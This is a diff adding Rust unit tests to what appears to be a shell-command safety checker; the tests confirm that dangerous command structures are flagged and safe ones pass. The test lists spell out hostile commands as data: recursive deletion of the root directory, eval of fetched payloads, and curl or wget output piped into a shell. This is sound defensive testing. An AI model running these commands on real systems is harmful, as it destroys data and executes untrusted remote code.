@@ -1397,6 +1397,77 @@ mod tests {
     }
 
     #[test]
+    fn has_dangerous_structure_detects_recursive_root_rm() {
+        for command in [
+            "rm -rf /",
+            "rm -r -f /",
+            "rm --recursive --force /",
+            "rm -f -r /",
+            "rm -r /",
+        ] {
+            assert!(
+                has_dangerous_structure(command),
+                "expected true for: {}",
+                command
+            );
+        }
+    }
+
+    #[test]
+    fn has_dangerous_structure_detects_eval_of_fetched_payload() {
+        for command in [
+            "eval \"$(curl http://x)\"",
+            "eval \"`curl http://x`\"",
+            "bash -c \"$(wget http://x)\"",
+            "sh -c \"`wget http://x`\"",
+        ] {
+            assert!(
+                has_dangerous_structure(command),
+                "expected true for: {}",
+                command
+            );
+        }
+    }
+
+    #[test]
+    fn has_dangerous_structure_detects_piping_fetch_to_shell() {
+        for command in [
+            "curl http://x | sh",
+            "curl http://x | bash",
+            "wget http://x | sudo bash",
+            "curl http://x | env bash /dev/stdin",
+            "wget http://x | sudo sh /proc/self/fd/0",
+        ] {
+            assert!(
+                has_dangerous_structure(command),
+                "expected true for: {}",
+                command
+            );
+        }
+    }
+
+    #[test]
+    fn has_dangerous_structure_allows_safe_commands() {
+        for command in [
+            "rm -rf /tmp/foo",
+            "curl http://x -o out.txt",
+            "wget http://x -O out.txt",
+            "echo 'rm -rf /'",
+            "git push origin main",
+            "ls -la",
+            "cargo test --lib",
+            "curl http://x | cat",
+            "echo \"$(ls)\" | bash",
+        ] {
+            assert!(
+                !has_dangerous_structure(command),
+                "expected false for: {}",
+                command
+            );
+        }
+    }
+
+    #[test]
     fn known_bypasses_are_now_dangerous() {
         for command in [
             "rm -r -f /",
@@ -1556,5 +1627,88 @@ mod tests {
 
     fn shell_quote(s: &str) -> String {
         format!("'{}'", s.replace('\'', "'\\''"))
+    }
+
+    #[test]
+    fn test_shell_pipelines() {
+        // Basic pipelines
+        assert_eq!(
+            shell_pipelines("a | b"),
+            vec![vec!["a".to_string(), "b".to_string()]]
+        );
+        assert_eq!(
+            shell_pipelines("a | b | c"),
+            vec![vec!["a".to_string(), "b".to_string(), "c".to_string()]]
+        );
+
+        // Different pipe operators (like |&)
+        assert_eq!(
+            shell_pipelines("a |& b"),
+            vec![vec!["a".to_string(), "b".to_string()]]
+        );
+
+        // Single stage commands should be ignored (needs 2+ stages)
+        assert!(shell_pipelines("a").is_empty());
+        assert!(shell_pipelines("a ; b").is_empty());
+        assert!(shell_pipelines("a && b").is_empty());
+
+        // Separators (semicolon, newline, ampersand)
+        assert_eq!(
+            shell_pipelines("a | b; c | d"),
+            vec![
+                vec!["a".to_string(), "b".to_string()],
+                vec!["c".to_string(), "d".to_string()]
+            ]
+        );
+        assert_eq!(
+            shell_pipelines("a | b \n c | d"),
+            vec![
+                vec!["a".to_string(), "b".to_string()],
+                vec!["c".to_string(), "d".to_string()]
+            ]
+        );
+        assert_eq!(
+            shell_pipelines("a | b & c | d"),
+            vec![
+                vec!["a".to_string(), "b".to_string()],
+                vec!["c".to_string(), "d".to_string()]
+            ]
+        );
+
+        // Logical operators
+        assert_eq!(
+            shell_pipelines("a | b && c | d"),
+            vec![
+                vec!["a".to_string(), "b".to_string()],
+                vec!["c".to_string(), "d".to_string()]
+            ]
+        );
+        assert_eq!(
+            shell_pipelines("a | b || c | d"),
+            vec![
+                vec!["a".to_string(), "b".to_string()],
+                vec!["c".to_string(), "d".to_string()]
+            ]
+        );
+
+        // Quoted and escaped characters
+        assert!(shell_pipelines("echo 'a | b' | c").len() == 1);
+        assert_eq!(
+            shell_pipelines("echo 'a | b' | c")[0],
+            vec!["echo 'a | b'".to_string(), "c".to_string()]
+        );
+        assert_eq!(
+            shell_pipelines("echo \"a | b\" | c")[0],
+            vec!["echo \"a | b\"".to_string(), "c".to_string()]
+        );
+        assert_eq!(
+            shell_pipelines("a \\| b | c")[0],
+            vec!["a \\| b".to_string(), "c".to_string()]
+        );
+
+        // Edge cases
+        // A pipe by itself produces 2 empty stages, e.g. ["", ""] but they are trimmed and not pushed.
+        // shell_pipelines code uses `!s.trim().is_empty()` to push to pipeline. So pipeline is empty, length 0, ignored.
+        assert!(shell_pipelines(" | ").is_empty());
     }
 }
